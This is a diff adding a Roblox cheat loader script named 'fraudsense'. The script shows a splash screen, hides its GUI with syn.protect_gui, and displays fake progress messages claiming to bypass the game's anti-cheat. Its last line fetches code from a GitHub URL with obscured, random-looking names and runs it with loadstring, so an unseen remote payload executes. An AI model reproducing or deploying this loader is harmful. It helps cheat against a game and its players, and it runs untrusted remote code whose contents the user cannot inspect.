@@ -1,0 +1,173 @@
+--loader
+local version = tostring(game:HttpGet("https://raw.githubusercontent.com/laagginq/informant/main/get/version"))
+
+local fraudzloader = Instance.new("ScreenGui")
+local LoaderFrame = Instance.new("Frame")
+local UIGradient = Instance.new("UIGradient")
+local Title = Instance.new("TextLabel")
+local version2 = Instance.new("TextLabel")
+local Bar = Instance.new("Frame")
+local UIGradient_2 = Instance.new("UIGradient")
+local Bar2 = Instance.new("Frame")
+local Stages = Instance.new("Frame")
+local Stage1 = Instance.new("TextLabel")
+local Stage2 = Instance.new("TextLabel")
+local Stage4 = Instance.new("TextLabel")
+local Stage3 = Instance.new("TextLabel")
+local Stage5 = Instance.new("TextLabel")
+fraudzloader.Name = math.random(1111,9999)
+if syn then syn.protect_gui(fraudzloader) end
+fraudzloader.Parent = game.CoreGui
+fraudzloader.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+LoaderFrame.Name = "LoaderFrame"
+LoaderFrame.Parent = fraudzloader
+LoaderFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+LoaderFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+LoaderFrame.BorderSizePixel = 0
+LoaderFrame.Position = UDim2.new(0.419409245, 0, 0.466257662, 0)
+LoaderFrame.Size = UDim2.new(0, 353, 0, 183)
+Title.Name = "Title"
+Title.Parent = LoaderFrame
+Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Title.BackgroundTransparency = 1.000
+Title.Position = UDim2.new(0.0793201104, 0, 0.169398904, 0)
+Title.Size = UDim2.new(0, 297, 0, 24)
+Title.Font = Enum.Font.GothamBold
+Title.Text = "fraudsense"
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.TextSize = 23.000
+Title.TextXAlignment = Enum.TextXAlignment.Left
+version2.Name = "version"
+version2.Parent = LoaderFrame
+version2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+version2.BackgroundTransparency = 1.000
+version2.Position = UDim2.new(0.0793201104, 0, 0.300546467, 0)
+version2.Size = UDim2.new(0, 191, 0, 18)
+version2.Font = Enum.Font.Gotham
+version2.Text = "v"..version
+version2.TextColor3 = Color3.fromRGB(255, 255, 255)
+version2.TextSize = 12.000
+version2.TextXAlignment = Enum.TextXAlignment.Left
+Bar.Name = "Bar"
+Bar.Parent = LoaderFrame
+Bar.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+Bar.BorderSizePixel = 0
+Bar.Position = UDim2.new(0.0679886714, 0, 0.530054629, 0)
+Bar.Size = UDim2.new(0, 304, 0, 18)
+Bar2.Name = "Bar2"
+Bar2.Parent = Bar
+Bar2.BackgroundColor3 = Color3.fromRGB(112, 4, 4)
+Bar2.BorderSizePixel = 0
+Bar2.Size = UDim2.new(0, 0, 0, 18)
+Stages.Name = "Stages"
+Stages.Parent = LoaderFrame
+Stages.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Stages.BackgroundTransparency = 1.000
+Stages.Position = UDim2.new(0.0793201104, 0, 0.431694001, 0)
+Stages.Size = UDim2.new(0, 297, 0, 18)
+Stage1.Name = "Stage1"
+Stage1.Parent = Stages
+Stage1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Stage1.BackgroundTransparency = 1.000
+Stage1.Size = UDim2.new(0, 296, 0, 18)
+Stage1.Font = Enum.Font.Gotham
+Stage1.Text = "Bypassing Anti Cheat..."
+Stage1.TextColor3 = Color3.fromRGB(255, 255, 255)
+Stage1.TextSize = 14.000
+Stage1.TextTransparency = 1.000
+Stage2.Name = "Stage2"
+Stage2.Parent = Stages
+Stage2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Stage2.BackgroundTransparency = 1.000
+Stage2.Size = UDim2.new(0, 296, 0, 18)
+Stage2.Font = Enum.Font.Gotham
+Stage2.Text = "Bypass Successful."
+Stage2.TextColor3 = Color3.fromRGB(255, 255, 255)
+Stage2.TextSize = 14.000
+Stage2.TextTransparency = 1.000
+Stage4.Name = "Stage4"
+Stage4.Parent = Stages
+Stage4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Stage4.BackgroundTransparency = 1.000
+Stage4.Size = UDim2.new(0, 296, 0, 18)
+Stage4.Font = Enum.Font.Gotham
+Stage4.Text = "Prepared."
+Stage4.TextColor3 = Color3.fromRGB(255, 255, 255)
+Stage4.TextSize = 14.000
+Stage4.TextTransparency = 1.000
+Stage3.Name = "Stage3"
+Stage3.Parent = Stages
+Stage3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Stage3.BackgroundTransparency = 1.000
+Stage3.Size = UDim2.new(0, 296, 0, 18)
+Stage3.Font = Enum.Font.Gotham
+Stage3.Text = "Preparing Cheat"
+Stage3.TextColor3 = Color3.fromRGB(255, 255, 255)
+Stage3.TextSize = 14.000
+Stage3.TextTransparency = 1.000
+Stage5.Name = "Stage5"
+Stage5.Parent = Stages
+Stage5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Stage5.BackgroundTransparency = 1.000
+Stage5.Size = UDim2.new(0, 296, 0, 18)
+Stage5.Font = Enum.Font.Gotham
+Stage5.Text = "Welcome, "..game.Players.LocalPlayer.Name
+Stage5.TextColor3 = Color3.fromRGB(255, 255, 255)
+Stage5.TextSize = 14.000
+Stage5.TextTransparency = 1.000
+local function gui(last, sex, t, s, inorout)
+	local TI = TweenInfo.new(t or 1, s or Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
+	local Tweening = game:GetService("TweenService"):Create(last, TI, sex)
+	Tweening:Play()
+end
+local cam = workspace.CurrentCamera
+local x = cam.ViewportSize.X
+local y = cam.ViewportSize.Y
+local newx = math.floor(x * 0.5)
+local newy = math.floor(y * 0.5)
+LoaderFrame.Position = UDim2.new(0,newx,0,newy)
+LoaderFrame.BackgroundTransparency = 1
+Bar.BackgroundTransparency = 1
+Bar2.BackgroundTransparency = 1
+Title.TextTransparency = 1
+version2.TextTransparency = 1
+gui(LoaderFrame, {BackgroundTransparency = 0}, 0.5)
+gui(Bar, {BackgroundTransparency = 0}, 0.5)
+gui(Bar2, {BackgroundTransparency = 0}, 0.5, Enum.EasingStyle.Exponential)
+gui(Title, {TextTransparency = 0}, 0.5)
+gui(version2, {TextTransparency = 0}, 0.5)
+wait(1)
+gui(Stage1, {TextTransparency = 0},0.2)
+gui(Bar2, {Size = UDim2.new(0, 51,0, 18)}, 0.5, Enum.EasingStyle.Exponential)
+wait(1)
+gui(Stage1, {TextTransparency = 1},0.2)
+wait(0.2)
+gui(Stage2, {TextTransparency = 0},0.2)
+gui(Bar2, {Size = UDim2.new(0, 86,0, 18)}, 0.5, Enum.EasingStyle.Exponential)
+wait(1)
+gui(Stage2, {TextTransparency = 1},0.2)
+wait(0.2)
+gui(Stage3, {TextTransparency = 0},0.2)
+gui(Bar2, {Size = UDim2.new(0, 134,0, 18)}, 0.5, Enum.EasingStyle.Exponential)
+wait(1)
+gui(Stage3, {TextTransparency = 1},0.2)
+wait(0.2)
+gui(Stage4, {TextTransparency = 0},0.2)
+gui(Bar2, {Size = UDim2.new(0, 185,0, 18)}, 0.5, Enum.EasingStyle.Exponential)
+Stage5.Text = "Welcome, "..game.Players.LocalPlayer.Name
+wait(1)
+gui(Stage4, {TextTransparency = 1},0.2)
+wait(0.2)
+gui(Stage5, {TextTransparency = 0},0.2)
+gui(Bar2, {Size = UDim2.new(0, 304,0, 18)}, 0.5, Enum.EasingStyle.Exponential)
+wait(1)
+gui(Stage5, {TextTransparency = 1},0.2)
+wait(1)
+gui(LoaderFrame, {BackgroundTransparency = 1}, 0.5)
+gui(Bar, {BackgroundTransparency = 1}, 0.5)
+gui(Bar2, {BackgroundTransparency = 1}, 0.5)
+gui(Title, {TextTransparency = 1}, 0.5)
+gui(version2, {TextTransparency = 1}, 0.5)
+wait(0.5)
+fraudzloader:Destroy()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/23b49j872b47324b723butwerbuwehbrwebr3/asdnasn7n457378n34578n6347856b7345hn34567b43573475b34677ewbr-/main/%5En2uwenuh%C4%B1rnwehu%C4%B1hweyurgyuewrn"))();
